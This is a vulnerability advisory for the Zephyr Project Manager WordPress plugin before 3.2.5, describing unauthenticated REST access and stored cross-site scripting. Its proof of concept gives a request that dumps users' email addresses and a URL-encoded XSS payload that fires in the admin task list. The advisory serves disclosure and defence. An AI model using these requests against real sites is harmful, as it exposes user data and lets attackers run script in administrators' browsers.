## WordPress Plugin Vulnerabilities

# Zephyr Project Manager < 3.2.5 - Unauthorised REST Calls to Stored XSS

### Description

The plugin does not have proper authorisation (even when the Require Authorisation for REST API Requests is enabled) in all its REST endpoints, allowing unauthenticated users to call them either directly. Furthermore, due to the lack of sanitisation and escaping, it could also allow them to perform Stored Cross-Site Scripting attacks against logged in admins

### Proof of Concept

Get all users email addresses: http://example.com/wp-json/zephyr\_project\_manager/v1/users
http://example.com/wp-json/zephyr\_project\_manager/v1/tasks/create/?name=%22%20style%3danimation-name%3arotation%20onanimationstart%3dalert(%2fXSS%2f)%2f%2f
The XSS will be trigged when viewing a list where the tasks is displayed, for example All Tasks at /wp-admin/admin.php?page=zephyr\_project\_manager\_tasks
